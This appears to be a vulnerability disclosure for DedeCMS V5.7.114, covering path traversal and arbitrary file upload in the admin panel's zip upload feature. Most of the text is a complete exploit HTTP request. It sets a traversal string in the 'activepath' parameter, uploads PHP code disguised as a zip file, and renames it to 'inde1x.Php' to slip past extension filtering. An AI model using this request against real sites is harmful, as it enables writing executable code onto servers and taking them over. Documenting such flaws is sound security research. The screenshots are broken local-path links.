# Dedecms Path traversal+arbitrary file upload

​	The zip compression file upload function of the Dreamweaver backend software manager has vulnerabilities such as path traversal and arbitrary file upload

![image-20240708130926507](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitOne.assets\image-20240708130926507.png)

​	E: \ seebug \ phpstudy is the root directory of my current web integration environment deployment. The current project is deployed in the 127.0.0.1-9600 folder under the WWW path

![image-20240708113031935](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitOne.assets\image-20240708113031935.png)

​	visit http://127.0.0.1:9600/dede/ And log in to the backend of dedecms to create a new atlas list http://127.0.0.1:9600/dede/album_add.php The interface is shown below

![image-20240712135020653](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitOne.assets\image-20240712135020653.png)	The vulnerability mainly appears at the compressed file upload location

![image-20240712135159882](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitOne.assets\image-20240712135159882.png)

```http
POST /include/dialog/select_soft_post.php HTTP/1.1
Host: 127.0.0.1:9600
Content-Length: 752
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9600
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGneeoYoNcoA3cyfK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9600/include/dialog/select_soft.php?f=form1.zipfile
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=9fvqmoiniui5peunoom189bb23; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1ebb58ecac915613; _csrf_name_2f6ef1b1=ef87ce85f5d16c9875d2c6089936835b; _csrf_name_2f6ef1b11BH21ANI1AGD297L1FF21LN02BGE1DNG=c1e0489e3c20f4bf; last_vtime=1720421835; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=070401ac415b7cb7; last_vid=admin; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=501af9a85db1a161; OrdersId=9448BQQIAFJRAgIFAQIIXQINU1cPAAFRVAIGAwY2FGYEVQAFAAoGVlAAYHsGBgY; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D6; DedeLoginTime=1720426605; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=629ca267a38c9755; Shop_De_85=626cVlNVBgkHU1FVU1QBAAFTDwVTCVJXUgkDUlNbAV8OB0QWEQxVXApTRxANCxBFCkVVRxpfRFtcARdACkYJBwsXJ1VGXQYcDyJEIFtHJXMSIXYXJgkUdycVcHBGd1ZHDgJHXiFAcw0SISBAWyE; Shop_De_78=b741AwUHVAQBCAIBUlIFVwhVWg8GXwMEAAVaClRQAgUCARBDR14HUQwNAhcXWFkVQgxHc1NDCXETdyAUBkwfVkBUCwITQw1AXV0PFCcFFVkBFFp3QCMFF3dyRgsiHCMNEHhyFgwHQXECHQoBRw5y
Connection: close

------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="activepath"

/uploads/..\/..\/..\/
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="f"

form1.zipfile
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="job"

upload
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="uploadfile"; filename="try.zip"
Content-Type: application/x-zip-compressed

<?php echo 123;?>
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="newname"

inde1x.Php
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="sb1"

确定
------WebKitFormBoundaryGneeoYoNcoA3cyfK--
```

​	activepath did not perform sufficient filtering here, resulting in path traversal that can be achieved by controlling the Activepath parameter to upload ZIP compressed files at any location

![image-20240708171125047](E:\360MoveData\Users\HideInDarkness\Desktop\dedecms\dedecms\V5.7.114-UTF8\V5.7.114-UTF8ExploitOne.assets\image-20240708171125047.png)